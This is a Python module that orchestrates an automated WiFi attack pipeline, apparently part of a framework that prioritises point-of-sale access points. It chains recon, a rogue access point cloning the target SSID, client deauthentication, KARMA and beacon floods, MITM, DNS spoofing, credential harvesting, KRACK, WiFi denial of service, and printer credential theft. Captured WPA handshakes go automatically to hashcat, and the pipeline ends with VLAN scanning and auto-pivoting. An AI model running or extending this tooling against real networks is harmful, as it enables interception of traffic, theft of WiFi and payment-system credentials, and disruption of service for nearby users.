"""
Attack Orchestrator (Stage 2 Enhanced)
──────────────────────────────────────
Automated attack pipeline that uses recon scan results to:
  1. Select the best target (strongest POS AP, or strongest AP overall)
  2. Extract its SSID, channel, and associated clients from the database
  3. Launch rogue AP on the same SSID/channel
  4. Start deauth engine targeting the real AP's clients (with signal filtering)
  5. Flood known beacons + KARMA (respond to all probe requests)
  6. Continue background recon to dynamically feed new clients into deauth
  7. Capture WPA handshakes to PCAP for offline cracking
  8. Test credentials against real AP to verify compromise

No manual target specification required — everything is driven by scan data.
"""

import time
import threading
import os

from scapy.all import sniff, raw, RandMAC
from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11Elt
from scapy.layers.eap import EAPOL

from .config import CHANNELS_24GHZ, WIFI_BROADCAST, log
from .database import POSDatabase
from .recon import ReconEngine
from .deauth import DeauthEngine
from .handshake import HandshakeCapture
from .signal_targeting import SignalTargeting
from .event_bus import get_event_bus, EventType

# WPA2 crypto imports (guarded for optional dependency)
try:
    from .wpa2 import (
        derive_pmk as wpa2_derive_pmk,
        derive_ptk as wpa2_derive_ptk,
        verify_eapol_mic as wpa2_verify_eapol_mic,
        extract_key_hierarchy as wpa2_extract_key_hierarchy,
        compute_eapol_mic as wpa2_compute_eapol_mic,
        EAPOLKeyFrame as WPA2EAPOLKeyFrame,
        CipherSuite as WPA2CipherSuite,
        detect_cipher_from_frame as wpa2_detect_cipher,
        extract_handshake_pair as wpa2_extract_handshake_pair,
    )
    _HAS_WPA2 = True
except ImportError:
    _HAS_WPA2 = False


class AttackOrchestrator:
    """
    Fully automated attack pipeline driven by recon scan data.

    Flow:
        1. Run ReconEngine for configured duration (populates DB)
        2. Query DB for best target AP (POS priority, then strongest signal)
        3. Pull all known clients of that AP from DB
        4. Launch RogueAP with scanned SSID + channel
        5. Start DeauthEngine targeting scanned clients
        6. Start KnownBeacons with probed SSIDs from scanned clients
        7. Background recon continues feeding new clients into deauth

    Plugin Support:
        The orchestrator can load plugins dynamically via PluginLoader.
        Plugins supplement but do not replace the built-in attack modules.
        Use load_plugins() to discover and register available plugins.
    """

    def __init__(self, monitor_iface, ap_iface, db=None, channels=None,
                 target_bssid=None, target_ssid=None, target_channel=None,
                 recon_duration=30, enable_beacons=True,
                 enable_karma=True, test_credentials=True,
                 enable_isolation_check=True, signal_rssi_limit=-80,
                 enable_ap_clone=True, enable_krack=True,
                 enable_dos=True, dos_mode=None,
                 enable_client_isolation=True,
                 enable_printer_attacks=True,
                 enable_auto_pivot=True,
                 enable_client_profiling=True,
                 enable_cred_enrichment=True,
                 enable_hashcat=True, hashcat_wordlist=None,
                 enable_vlan_scan=True,
                 plugins=None, plugins_dir=None,
                 enable_autopwn=False, autopwn_config=None):
        self.monitor_iface = monitor_iface
        self.ap_iface = ap_iface
        self.channels = channels or CHANNELS_24GHZ
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = target_channel
        self.recon_duration = recon_duration
        self.enable_beacons = enable_beacons
        self.enable_karma = enable_karma
        self.test_credentials = test_credentials
        self.enable_isolation_check = enable_isolation_check
        self.signal_rssi_limit = signal_rssi_limit

        # New attack module flags
        self.enable_ap_clone = enable_ap_clone
        self.enable_krack = enable_krack
        self.enable_dos = enable_dos
        self.dos_mode = dos_mode or "cts_flood"
        self.enable_client_isolation = enable_client_isolation
        self.enable_printer_attacks = enable_printer_attacks

        # Credential intelligence flags
        self.enable_auto_pivot = enable_auto_pivot
        self.enable_client_profiling = enable_client_profiling
        self.enable_cred_enrichment = enable_cred_enrichment
        self.enable_hashcat = enable_hashcat
        self.hashcat_wordlist = hashcat_wordlist

        # VLAN scanning flag
        self.enable_vlan_scan = enable_vlan_scan

        self.db = db or POSDatabase()
        self.recon = ReconEngine(monitor_iface, self.db, channels=self.channels)
        self.deauth = DeauthEngine(monitor_iface)
        self.rogue_ap = None
        self.beacons = None
        self.karma = None
        self.handshakes = HandshakeCapture()
        self.signal_filter = SignalTargeting(rssi_threshold=signal_rssi_limit)
        self.cred_tester = None
        if test_credentials:
            from .cred_tester import CredentialTester
            self.cred_tester = CredentialTester(monitor_iface)
        self.isolation_detector = None

        # New attack modules
        self.mitm_engine = None
        self.ssl_stripper = None
        self.dns_spoof = None
        self.cred_harvester = None
        self.network_disruption = None

        # Advanced WiFi attack modules
        self.ap_clone = None
        self.krack_engine = None
        self.dos_engine = None
        self.client_isolation = None

        # Printer attack modules
        self.printer_recon = None
        self.print_interceptor = None
        self.printer_cred_harvester = None

        # Credential intelligence modules
        self.auto_pivot = None
        self.client_profiler = None
        self.cred_enrichment = None
        self.hashcat = None

        # VLAN scanning modules
        self.vlan_scanner = None
        self.network_mapper = None

        # Plugin system
        self._plugin_manager = None
        self._active_plugins = []
        self._plugins_dir = plugins_dir
        self._requested_plugins = plugins  # list of plugin names to enable

        # Event bus for lifecycle events
        self._event_bus = get_event_bus()

        # AutoPwn mode
        self.enable_autopwn = enable_autopwn
        self._autopwn_config = autopwn_config
        self._autopwn_engine = None

        # Progress callback: called with (phase: str, detail: str, pct: int|None)
        self._progress_callbacks = []

        self.running = False

    def on_progress(self, callback):
        """Register a progress callback.

        The callback is invoked as callback(phase, detail, percent) where:
          - phase: str — current attack phase name (e.g., "recon", "deauth", "rogue_ap")
          - detail: str — human-readable description of current activity
          - percent: int|None — completion percentage (0-100) if known, None otherwise

        Multiple callbacks can be registered. They are called synchronously
        from the orchestrator thread.

        Args:
            callback: Callable[[str, str, Optional[int]], None]
        """
        self._progress_callbacks.append(callback)

    def _notify_progress(self, phase, detail, percent=None):
        """Notify all registered progress callbacks."""
        for cb in self._progress_callbacks:
            try:
                cb(phase, detail, percent)
            except Exception as e:
                log.debug(f"Progress callback error: {e}")

    def load_plugins(self, plugin_dirs=None):
        """
        Discover and load available attack plugins using the new PluginManager.

        This method initializes the PluginManager, scans the default
        plugins directory (and any additional dirs), and optionally
        enables only the plugins specified in self._requested_plugins.

        Args:
            plugin_dirs: Optional list of additional directories to scan.

        Returns:
            Number of plugins loaded.
        """
        from .plugin_system import PluginManager
        from pathlib import Path

        self._plugin_manager = PluginManager()
        total_discovered = 0

        # Default plugins directory
        default_dir = Path(__file__).parent / "plugins"
        if default_dir.is_dir():
            total_discovered += self._plugin_manager.discover(default_dir)

        # Additional directories
        if self._plugins_dir:
            p = Path(self._plugins_dir)
            if p.is_dir():
                total_discovered += self._plugin_manager.discover(p)

        if plugin_dirs:
            for d in plugin_dirs:
                p = Path(d)
                if p.is_dir():
                    total_discovered += self._plugin_manager.discover(p)

        log.info(f"Plugin system: {total_discovered} discovered, "
                 f"{len(self._plugin_manager.list_loaded())} loaded")
        return total_discovered

    def get_plugin_manager(self):
        """Return the PluginManager instance (or None if not initialized)."""
        return self._plugin_manager

    async def start_autopwn(self):
        """
        Start the autonomous attack engine (async state machine).

        Creates an AutoPwnEngine instance, wires it to the existing
        ReconEngine/DeauthEngine/HandshakeCapture via asyncio.to_thread()
        wrappers, and runs the state machine loop.

        This is the modern entry point. The legacy start() method will
        delegate here if enable_autopwn is True.
        """
        import asyncio as _asyncio
        from .autopwn_engine import AutoPwnEngine, AutoPwnConfig, AutoPwnMode

        config = self._autopwn_config
        if config is None:
            config = AutoPwnConfig(
                mode=AutoPwnMode.AGGRESSIVE,
                session_dir="logs/autopwn",
            )

        # Create a scanner adapter that wraps posframework's ReconEngine
        scanner_adapter = _ReconScannerAdapter(
            recon=self.recon,
            db=self.db,
            timeout=self.recon_duration,
        )

        self._autopwn_engine = AutoPwnEngine(
            config=config,
            wifi_scanner=scanner_adapter,
            capture_manager=self._capture_manager_adapter(),
            cracker=None,
        )

        self.running = True

        # Emit system starting event
        self._event_bus.emit_sync(EventType.SYSTEM_STARTING, {
            "monitor_iface": self.monitor_iface,
            "ap_iface": self.ap_iface,
            "mode": "autopwn",
        }, source="orchestrator")

        try:
            await self._autopwn_engine.start()
            # Engine runs until stopped externally
            while self._autopwn_engine.is_running:
                await _asyncio.sleep(1.0)
        except _asyncio.CancelledError:
            pass
        finally:
            if self._autopwn_engine.is_running:
                await self._autopwn_engine.stop()
            self.running = False

    def _capture_manager_adapter(self):
        """Create an adapter for HandshakeCapture if available."""
        if self.handshakes:
            return _HandshakeCaptureAdapter(self.handshakes, self.deauth)
        return None

    def _auto_select_target(self):
        """Select target from recon data. POS APs get priority."""
        if self.target_bssid and self.target_ssid and self.target_channel:
            return True

        # Try POS AP first
        row = self.db.get_strongest_pos_ap()
        if not row:
            row = self.db.get_strongest_ap()
        if not row:
            log.error("No targets found in recon data")
            return False

        self.target_bssid = row[0]
        self.target_ssid = row[1] or "FreeWiFi"
        self.target_channel = row[2] or 6
        vendor = row[3] if len(row) > 3 else "Unknown"
        rssi = row[4] if len(row) > 4 else -100

        log.info(f"Auto-selected target: '{self.target_ssid}' ({self.target_bssid}) "
                 f"ch {self.target_channel} | {vendor} | {rssi}dBm")
        return True

    def start(self):
        """Execute the full automated attack chain.

        If enable_autopwn is True, delegates to start_autopwn() via
        asyncio.run(). Otherwise runs the legacy synchronous pipeline.
        """
        if self.enable_autopwn:
            import asyncio as _asyncio
            try:
                loop = _asyncio.get_running_loop()
                # Already in async context, create task
                loop.create_task(self.start_autopwn())
            except RuntimeError:
                _asyncio.run(self.start_autopwn())
            return True

        # Lazy imports for optional modules
        from .beacons import KnownBeaconsEngine
        from .karma import KARMAEngine
        from .rogueap import RogueAPEngine
        from .isolation import IsolationDetector
        from .cred_tester import CredentialTester
        from .mitm import MITMEngine
        from .dns_spoof import DNSSpoofEngine
        from .cred_harvester import CredentialHarvester
        from .ap_clone import APCloneEngine
        from .krack import KRACKEngine
        from .dos_wifi import WiFiDoSEngine
        from .client_isolation import ClientIsolationEngine
        from .printer_recon import PrinterRecon
        from .printer_creds import PrinterCredentialHarvester as PrinterCredHarvester
        from .cred_enrichment import CredentialEnrichment
        from .client_profiler import ClientProfiler
        from .auto_pivot import AutoPivot
        from .hashcat_integration import HashcatIntegration
        from .vlan_scanner import VLANScanner
        from .network_mapper import NetworkSegmentationMapper

        self.running = True
        self._attack_start_time = time.time()
        log.info(f"Attack chain initiated at {time.strftime('%Y-%m-%d %H:%M:%S')}")

        # Emit system starting event
        self._event_bus.emit_sync(EventType.SYSTEM_STARTING, {
            "monitor_iface": self.monitor_iface,
            "ap_iface": self.ap_iface,
            "timestamp": self._attack_start_time,
        }, source="orchestrator")

        # ── Phase 1: Passive Recon ────────────────────────────────────────────
        if self.recon_duration > 0:
            log.info(f"Phase 1: Passive recon ({self.recon_duration}s)...")
            self._notify_progress("recon", f"Scanning for {self.recon_duration}s", 0)
            self.recon.set_signal_targeting(self.signal_filter)

            # Start intel enricher alongside recon for real-time data enrichment
            intel_enricher = None
            try:
                from .intel_enricher import IntelEnricher
                intel_enricher = IntelEnricher(
                    interface=self.monitor_iface, db=self.db
                )
                self.recon._intel_enricher = intel_enricher
            except (ImportError, Exception) as e:
                log.debug(f"Intel enricher not available: {e}")

            self.recon.start(timeout=self.recon_duration)
            self.recon.stop()
        else:
            log.info("Phase 1: Skipped (using existing recon data)")

        stats = self.db.get_stats()
        log.info(f"Recon complete: {stats['access_points']} APs, "
                 f"{stats['clients']} clients, "
                 f"{stats['pos_access_points']} POS APs found")

        # ── Phase 2: Target Selection (from scan data) ────────────────────────
        self._notify_progress("target_selection", "Selecting best target from scan data", 25)
        if not self._auto_select_target():
            self.running = False
            return False

        # Emit AP discovered event for the selected target
        self._event_bus.emit_sync(EventType.AP_DISCOVERED, {
            "bssid": self.target_bssid,
            "ssid": self.target_ssid,
            "channel": self.target_channel,
        }, source="orchestrator")

        # ── Phase 2b: Check for client isolation ──────────────────────────────
        if self.enable_isolation_check:
            self.isolation_detector = IsolationDetector(
                self.monitor_iface, self.target_bssid, self.db)
            if self.isolation_detector.detect(timeout=30):
                log.warning("AP isolation detected - attack may be less effective")
                log.warning("Clients may not be able to reach our rogue AP")

        # Get all clients of target AP from scan data (now returns (mac, rssi) tuples)
        all_clients_data = self.db.get_clients_for_bssid(self.target_bssid)
        all_clients = set()

        # Filter by signal strength using RSSI data from database
        close_clients = set()
        for client_mac, rssi in all_clients_data:
            all_clients.add(client_mac)
            if self.signal_filter.should_deauth(client_mac):
                close_clients.add(client_mac)
            elif rssi is not None and self.signal_filter.should_deauth_with_rssi(client_mac, rssi):
                close_clients.add(client_mac)

        log.info(f"Target has {len(all_clients)} total clients, "
                 f"{len(close_clients)} within signal range (RSSI > {self.signal_rssi_limit}dBm)")

        # ── Phase 3: Rogue AP (uses scanned SSID + channel) ──────────────────
        self._notify_progress("rogue_ap", f"Deploying rogue AP '{self.target_ssid}'", 40)
        # Emit attack started event
        self._event_bus.emit_sync(EventType.ATTACK_STARTED, {
            "target_bssid": self.target_bssid,
            "target_ssid": self.target_ssid,
            "target_channel": self.target_channel,
            "clients_in_range": len(close_clients),
        }, source="orchestrator")

        rogue_mac = str(RandMAC())
        self.rogue_ap = RogueAPEngine(
            interface=self.ap_iface,
            ssid=self.target_ssid,
            channel=self.target_channel,
            db=self.db,
            mac_address=rogue_mac,
        )
        if not self.rogue_ap.start():
            log.error("Failed to start rogue AP")
            self.running = False
            return False

        # ── Phase 4: Deauth (targets scanned clients with signal filtering) ───
        self._notify_progress("deauth", f"Deauthing {len(close_clients)} clients", 55)
        self.deauth.add_target(self.target_bssid, close_clients)
        self.deauth.start()

        # Emit deauth sent event
        self._event_bus.emit_sync(EventType.DEAUTH_SENT, {
            "target_bssid": self.target_bssid,
            "clients_targeted": list(close_clients),
        }, source="orchestrator")

        # ── Phase 5: Beacon Flood (uses probed SSIDs from scan) ──────────────
        if self.enable_beacons:
            self.beacons = KnownBeaconsEngine(self.monitor_iface, rogue_mac)
            self.beacons.add_probed_ssids_from_db(self.db)
            self.beacons.start()

        # ── Phase 5b: KARMA attack (respond to all probes) ───────────────────
        if self.enable_karma:
            self.karma = KARMAEngine(self.monitor_iface, rogue_mac)
            self.karma.start()
            log.info("KARMA attack enabled - will respond to all probe requests")

        # ── Phase 5c: Start new attack modules ────────────────────────────────
        # Start MITM for traffic interception
        if close_clients:
            self.mitm_engine = MITMEngine(self.monitor_iface)
            # MITM requires an IP address, not a MAC. Attempt ARP resolution
            # on the first close client to get its IP address.
            sample_client_mac = list(close_clients)[0] if close_clients else None
            sample_client_ip = None
            if sample_client_mac:
                try:
                    from scapy.all import srp, Ether, ARP
                    from .config import NETWORK_IP, NETWORK_MASK
                    # Use configured network subnet for ARP resolution
                    # Convert network/mask to CIDR for ARP scan
                    arp_subnet = NETWORK_IP + "/24"  # Use configured NETWORK_IP
                    # ARP who-has on the rogue AP subnet to resolve MAC -> IP
                    ans, _ = srp(
                        Ether(dst=sample_client_mac) / ARP(pdst=arp_subnet),
                        iface=self.ap_iface, timeout=2, verbose=False
                    )
                    for _, rcv in ans:
                        if rcv.haslayer(ARP) and rcv[ARP].hwsrc.lower() == sample_client_mac.lower():
                            sample_client_ip = rcv[ARP].psrc
                            break
                except Exception as e:
                    log.debug(f"ARP resolution for MITM target failed: {e}")

            if sample_client_ip:
                self.mitm_engine.start(target_ip=sample_client_ip)
                log.info(f"MITM attack started against {sample_client_ip} ({sample_client_mac})")
            else:
                log.warning(f"MITM skipped: could not resolve IP for client {sample_client_mac}")
                self.mitm_engine = None

        # Start DNS spoofing for all targets
        self.dns_spoof = DNSSpoofEngine(self.monitor_iface)
        self.dns_spoof.add_common_targets()
        self.dns_spoof.start()
        log.info("DNS spoofing enabled")

        # Start credential harvester
        self.cred_harvester = CredentialHarvester(self.monitor_iface, self.db)
        threading.Thread(target=self.cred_harvester.start, daemon=True).start()
        log.info("Credential harvester started")

        # ── Phase 5d: Advanced WiFi Attacks ──────────────────────────────────
        if self.enable_ap_clone:
            self.ap_clone = APCloneEngine(
                self.monitor_iface, self.db, self.target_bssid,
                self.target_ssid, self.target_channel)
            self.ap_clone.start()
            log.info("AP Clone engine enabled")

        if self.enable_client_isolation:
            self.client_isolation = ClientIsolationEngine(self.monitor_iface, self.db)
            for c in close_clients:
                self.client_isolation.add_target(c, self.target_bssid)
            self.client_isolation.start()
            log.info("Client isolation engine enabled")

        if self.enable_dos:
            self.dos_engine = WiFiDoSEngine(
                self.monitor_iface, self.target_bssid, self.target_channel)
            self.dos_engine.start(mode=self.dos_mode)
            log.info(f"WiFi DoS engine enabled (mode={self.dos_mode})")

        # ── Phase 5e: Printer Attacks ────────────────────────────────────────
        if self.enable_printer_attacks:
            self.printer_recon = PrinterRecon(self.monitor_iface, self.db)
            threading.Thread(target=self.printer_recon.start, daemon=True).start()
            log.info("Printer reconnaissance enabled")

            self.printer_cred_harvester = PrinterCredHarvester(self.monitor_iface, self.db)
            threading.Thread(target=self.printer_cred_harvester.start, daemon=True).start()
            log.info("Printer credential harvester enabled")

        # ── Phase 5f: Credential Intelligence ────────────────────────────────
        if self.enable_cred_enrichment:
            self.cred_enrichment = CredentialEnrichment(db=self.db)
            log.info("Credential enrichment enabled")

        if self.enable_client_profiling:
            self.client_profiler = ClientProfiler(db=self.db)
            log.info("Client profiling enabled")

        if self.enable_auto_pivot:
            self.auto_pivot = AutoPivot(self.monitor_iface)
            log.info("Auto-pivot enabled (will activate after successful cred test)")

        if self.enable_hashcat:
            self.hashcat = HashcatIntegration()
            log.info("Hashcat integration enabled")

        # ── Phase 5g: VLAN Scanning (post-pivot reconnaissance) ──────────────
        if self.enable_vlan_scan:
            self.vlan_scanner = VLANScanner(
                self.monitor_iface, db=self.db, sniff_timeout=30)
            self.network_mapper = NetworkSegmentationMapper(
                self.monitor_iface, db=self.db,
                vlan_scanner=self.vlan_scanner)
            threading.Thread(
                target=self._run_vlan_scan, daemon=True).start()
            log.info("VLAN scanning and network mapping enabled")

        # ── Phase 6: Background Recon (feeds new clients into deauth) ────────
        self._notify_progress("active", "All attack modules active, monitoring...", 100)
        self.recon.running = True
        threading.Thread(target=self._background_recon, daemon=True).start()

        log.info("=" * 60)
        log.info("AUTOMATED ATTACK ACTIVE (Stage 2)")
        log.info(f"  Target:  {self.target_bssid} ('{self.target_ssid}') ch {self.target_channel}")
        log.info(f"  Rogue:   {self.ap_iface} ({rogue_mac})")
        log.info(f"  Deauth:  {len(close_clients)} clients within range + broadcast")
        log.info(f"  Beacons: {'Active' if self.enable_beacons else 'Disabled'}")
        log.info(f"  KARMA:   {'Active' if self.enable_karma else 'Disabled'}")
        log.info(f"  Portal:  http://{self.rogue_ap.mac_address and '10.0.0.1'}:80")
        log.info("=" * 60)

        # Emit attack completed (all modules launched)
        self._event_bus.emit_sync(EventType.ATTACK_COMPLETED, {
            "target_bssid": self.target_bssid,
            "target_ssid": self.target_ssid,
            "modules_active": True,
        }, source="orchestrator")

        return True

    def verify_credential(self, ssid, password, handshake_frames):
        """
        Verify a WiFi credential using pure-Python WPA2 crypto.

        Derives PMK from password/SSID, computes PTK using nonces from
        captured handshake frames, then verifies the MIC on Msg2.

        Args:
            ssid: Network SSID
            password: WiFi password to verify
            handshake_frames: List of raw EAPOL frame bytes (must include
                              at least Msg1 and Msg2)

        Returns:
            True if the credential is valid (MIC matches), False otherwise.
        """
        if not _HAS_WPA2:
            log.warning("WPA2 module not available, cannot verify credential")
            return False

        if not handshake_frames or len(handshake_frames) < 2:
            log.warning("Need at least 2 handshake frames (Msg1 + Msg2)")
            return False

        try:
            # Extract Msg1/Msg2 using shared helper
            pair = wpa2_extract_handshake_pair(handshake_frames)
            if pair is None:
                log.warning("Could not identify Msg1 and Msg2 in handshake frames")
                return False

            msg1_frame, msg2_frame = pair
            anonce = msg1_frame.nonce
            snonce = msg2_frame.nonce

            # Detect cipher suite from key descriptor version in Msg2
            cipher_suite = wpa2_detect_cipher(msg2_frame)

            # Derive PMK from password and SSID
            pmk = wpa2_derive_pmk(password, ssid)

            # We need AP MAC and STA MAC - extract from context
            # Use target_bssid if available; for STA mac, derive from frame context
            ap_mac = self._mac_str_to_bytes(self.target_bssid) if self.target_bssid else None
            if ap_mac is None:
                log.warning("No AP MAC available for PTK derivation")
                return False

            # For STA MAC, try to get it from handshake capture
            sta_mac = None
            if hasattr(self, 'handshakes') and self.handshakes:
                # Get client MAC from handshake capture state
                for client_mac in self.handshakes._handshakes:
                    if isinstance(client_mac, str):
                        sta_mac = self._mac_str_to_bytes(client_mac)
                        break

            if sta_mac is None:
                log.warning("No STA MAC available for PTK derivation")
                return False

            # Derive PTK using detected cipher suite
            ptk = wpa2_derive_ptk(pmk, ap_mac, sta_mac, anonce, snonce,
                                  cipher_suite)

            # Extract KCK from PTK
            keys = wpa2_extract_key_hierarchy(ptk, cipher_suite)

            # Verify MIC on Msg2
            result = wpa2_verify_eapol_mic(keys.kck, msg2_frame)
            if result:
                log.info(f"Credential VERIFIED for SSID '{ssid}' via WPA2 crypto")
            else:
                log.debug(f"Credential verification FAILED for SSID '{ssid}'")

            return result

        except Exception as e:
            log.warning(f"Credential verification error: {e}")
            return False

    def _verify_handshake_crypto(self, client_mac, bssid, frames):
        """
        Verify a captured handshake using crypto if credentials are known.

        Called after a complete handshake is captured. Attempts MIC
        verification using any known credentials from cred_harvester
        or previous cred_tester results.

        Args:
            client_mac: Client MAC address string
            bssid: BSSID string
            frames: List of raw EAPOL frame bytes
        """
        if not _HAS_WPA2:
            return

        if not self.target_ssid:
            return

        # Gather known passwords from credential sources
        known_passwords = []

        if self.cred_harvester:
            try:
                creds = self.cred_harvester.get_credentials()
                for cred in creds:
                    if cred.get("password"):
                        known_passwords.append(cred["password"])
            except Exception:
                pass

        if self.cred_tester:
            try:
                results = self.cred_tester.get_results()
                for r in results:
                    if r.get("success") and r.get("password"):
                        known_passwords.append(r["password"])
            except Exception:
                pass

        if not known_passwords:
            log.debug("No known credentials to verify handshake against")
            return

        for password in known_passwords:
            if self.verify_credential(self.target_ssid, password, frames):
                log.critical(
                    f"Handshake crypto verification SUCCESS: "
                    f"{bssid} client={client_mac} password='{password}'"
                )
                return

        log.debug(f"No known credentials matched handshake for {bssid}")

    @staticmethod
    def _mac_str_to_bytes(mac_str):
        """Convert MAC address string 'AA:BB:CC:DD:EE:FF' to 6 bytes."""
        if not mac_str:
            return None
        try:
            return bytes.fromhex(mac_str.replace(":", "").replace("-", ""))
        except (ValueError, AttributeError):
            return None

    def _background_recon(self):
        """Continue sniffing to discover new clients and auto-add to deauth."""
        def handler(pkt):
            self.recon.packet_handler(pkt)
            # Capture EAPOL handshakes
            if pkt.haslayer(EAPOL):
                eapol_layer = pkt.getlayer(EAPOL)
                eapol_raw = raw(eapol_layer)
                msg_num = self.recon._identify_eapol_message(eapol_raw)
                if msg_num:
                    # Get client/mac from packet
                    ds_flags = pkt.FCfield & 0x3
                    if ds_flags == 0x1:
                        client_mac, bssid = pkt.addr2, pkt.addr1
                    elif ds_flags == 0x2:
                        client_mac, bssid = pkt.addr1, pkt.addr2
                    else:
                        client_mac, bssid = pkt.addr2, (pkt.addr3 or pkt.addr1)
                    if client_mac and bssid:
                        self.handshakes.add_frame(client_mac, bssid, pkt, msg_num)
                        # Check for complete handshake
                        if self.handshakes.is_complete(client_mac, bssid):
                            pcap_file = self.handshakes.export_pcap(client_mac, bssid)
                            if pcap_file and self.test_credentials:
                                log.info(f"Handshake saved to {pcap_file} - ready for hashcat")
                            # Verify handshake using crypto if credentials are known
                            if _HAS_WPA2:
                                raw_frames = self.handshakes.get_raw_frames(
                                    client_mac, bssid
                                ) if hasattr(self.handshakes, 'get_raw_frames') else []
                                if raw_frames:
                                    self._verify_handshake_crypto(
                                        client_mac, bssid, raw_frames
                                    )
                            # Auto-feed to hashcat if enabled
                            if pcap_file and self.hashcat and self.hashcat_wordlist:
                                self.hashcat.start_crack(pcap_file, self.hashcat_wordlist)
                                log.info(f"Auto-feeding handshake to hashcat: {pcap_file}")
                            # Trigger KRACK if enabled
                            if self.enable_krack and not self.krack_engine:
                                from .krack import KRACKEngine
                                self.krack_engine = KRACKEngine(
                                    self.monitor_iface, client_mac, bssid)
                                self.krack_engine.start()
                                log.info(f"KRACK engine launched against {client_mac}")

            # Client profiling from packets
            if self.client_profiler:
                self.client_profiler.update_from_packet(pkt)

            # Dynamically add newly seen clients of the target AP
            if pkt.haslayer(Dot11) and pkt.type == 2:
                client = pkt.addr2
                bssid = pkt.addr3
                if (bssid == self.target_bssid and client
                        and client != bssid and client != WIFI_BROADCAST):
                    # Signal filtering for new clients
                    if self.signal_filter.should_deauth(client):
                        if client not in self.deauth._targets.get(self.target_bssid, set()):
                            self.deauth._targets[self.target_bssid].add(client)
                            log.info(f"New client auto-targeted: {client}")

            # KARMA: respond to all probe requests
            if self.enable_karma and pkt.haslayer(Dot11ProbeReq):
                ssid_elt = pkt.getlayer(Dot11Elt)
                ssid = ""
                if ssid_elt and ssid_elt.ID == 0 and ssid_elt.info:
                    ssid = ssid_elt.info.decode(errors='ignore')
                client_mac = pkt.addr2
                if client_mac and self.karma:
                    self.karma.on_probe_request(client_mac, ssid)

        try:
            from scapy.all import raw
            sniff(iface=self.monitor_iface, prn=handler, store=0,
                  stop_filter=lambda x: not self.running)
        except OSError as e:
            if self.running:
                log.error(f"Background recon sniff failed (interface issue?): {e}")
        except Exception as e:
            if self.running:
                log.warning(f"Background recon stopped unexpectedly: {e}")

    def _run_vlan_scan(self):
        """Run VLAN scanning and network mapping in background."""
        try:
            log.info("VLAN scan phase: discovering VLANs...")
            self.vlan_scanner.start()

            # Wait for sniff to complete using public API
            self.vlan_scanner.wait_for_completion(timeout=35)

            self.vlan_scanner.stop()

            vlans = self.vlan_scanner.get_vlans()
            log.info(f"VLAN scan found {len(vlans)} VLANs, "
                     f"starting network mapping...")

            if vlans:
                self.network_mapper.start()
                self.network_mapper.map_all()
                self.network_mapper.stop()

                seg_map = self.network_mapper.get_map()
                log.info(f"Network mapping complete: "
                         f"{len(seg_map.get('segments', []))} segments, "
                         f"{len(seg_map.get('acl_gaps', []))} ACL gaps")
        except Exception as e:
            log.error(f"VLAN scan phase error: {e}")

    def stop(self):
        """Shut down all attack components gracefully."""
        self.running = False

        # Emit system stopping event
        self._event_bus.emit_sync(EventType.SYSTEM_STOPPING, {
            "reason": "user_initiated",
        }, source="orchestrator")

        if hasattr(self, '_attack_start_time'):
            duration = time.time() - self._attack_start_time
            log.info(f"Attack duration: {duration:.1f} seconds")
        
        # Stop all engines
        engines = [
            self.recon, self.deauth, self.beacons, self.karma, 
            self.rogue_ap, self.mitm_engine, self.ssl_stripper,
            self.dns_spoof, self.cred_harvester, self.network_disruption,
            self.ap_clone, self.krack_engine, self.dos_engine,
            self.client_isolation, self.printer_recon,
            self.print_interceptor, self.printer_cred_harvester,
            self.auto_pivot, self.hashcat,
            self.vlan_scanner, self.network_mapper
        ]
        
        for engine in engines:
            if engine:
                try:
                    engine.stop()
                except Exception as e:
                    log.error(f"Error stopping {engine.__class__.__name__}: {e}")
        
        # Now safe to close database
        if self.db:
            # Save client profiles before closing
            if self.client_profiler:
                self.client_profiler.save_to_db()
            self.db.close()
        
        # Export any remaining handshakes
        remaining = self.handshakes.export_all()
        if remaining:
            log.info(f"Exported {len(remaining)} additional handshakes")
        
        self.recon._print_status()
        
        # Run post-attack analysis
        self._run_post_attack_analysis()
        
        log.info("Attack terminated. All data saved.")

    def _run_post_attack_analysis(self):
        """Generate post-attack analysis and next steps."""
        from .post_attack import PostAttackAnalyzer

        log.info("=" * 60)
        log.info("POST-ATTACK ANALYSIS")
        log.info("=" * 60)

        analyzer = PostAttackAnalyzer(self.db)

        # Print summary to console
        analyzer.print_summary()

        # Export credentials
        credentials = analyzer.export_credentials()

        # Export handshakes
        analyzer.export_handshakes()

        # Generate full report
        report = analyzer.generate_report("exports/attack_report.json")

        # Print next steps
        log.info("\nNEXT STEPS:")
        for i, step in enumerate(analyzer.get_next_steps(priority_filter="HIGH"), 1):
            log.info(f"  {i}. {step}")

        log.info("=" * 60)


# ═══════════════════════════════════════════════════════════════════════════════
# AutoPwn Adapter Classes
# ═══════════════════════════════════════════════════════════════════════════════


class _ReconScannerAdapter:
    """
    Adapter that wraps posframework's ReconEngine to provide a scan()
    interface compatible with AutoPwnEngine's wifi_scanner parameter.

    The ReconEngine is synchronous (uses scapy sniff), so the AutoPwnEngine
    wraps this in asyncio.to_thread().
    """

    def __init__(self, recon, db, timeout=30):
        self._recon = recon
        self._db = db
        self._timeout = timeout

    def scan(self, channels=None):
        """
        Run a recon scan and return results as list of dicts.

        Executes ReconEngine for the configured duration, then queries the
        database for all discovered APs with their client associations.
        This method is synchronous - AutoPwnEngine wraps it in
        asyncio.to_thread() automatically.
        """
        # Run recon scan
        self._recon.start(timeout=self._timeout)
        self._recon.stop()

        # Pull APs and their clients from the database
        results = []
        try:
            self._db.cursor.execute(
                'SELECT bssid, ssid, channel, security, rssi, vendor '
                'FROM access_points'
            )
            for row in self._db.cursor.fetchall():
                bssid = row[0]
                ssid = row[1]
                channel = row[2]
                security = row[3]
                rssi = row[4]
                vendor = row[5] if len(row) > 5 else None

                # Get clients for this AP
                clients = []
                try:
                    client_data = self._db.get_clients_for_bssid(bssid)
                    clients = [mac for mac, _ in client_data]
                except Exception:
                    pass

                results.append({
                    "bssid": bssid,
                    "ssid": ssid,
                    "channel": channel,
                    "encryption": security,
                    "signal_dbm": rssi or -100,
                    "vendor": vendor,
                    "clients": clients,
                    "client_count": len(clients),
                })
        except Exception as e:
            log.error(f"ReconScannerAdapter: query failed: {e}")

        log.info(f"ReconScannerAdapter: scan returned {len(results)} APs")
        return results


class _HandshakeCaptureAdapter:
    """
    Adapter that wraps posframework's HandshakeCapture and DeauthEngine
    to provide a capture_manager interface for the attack chain.

    Bridges the synchronous scapy-based engines to async via to_thread().
    """

    def __init__(self, handshakes, deauth):
        self._handshakes = handshakes
        self._deauth = deauth
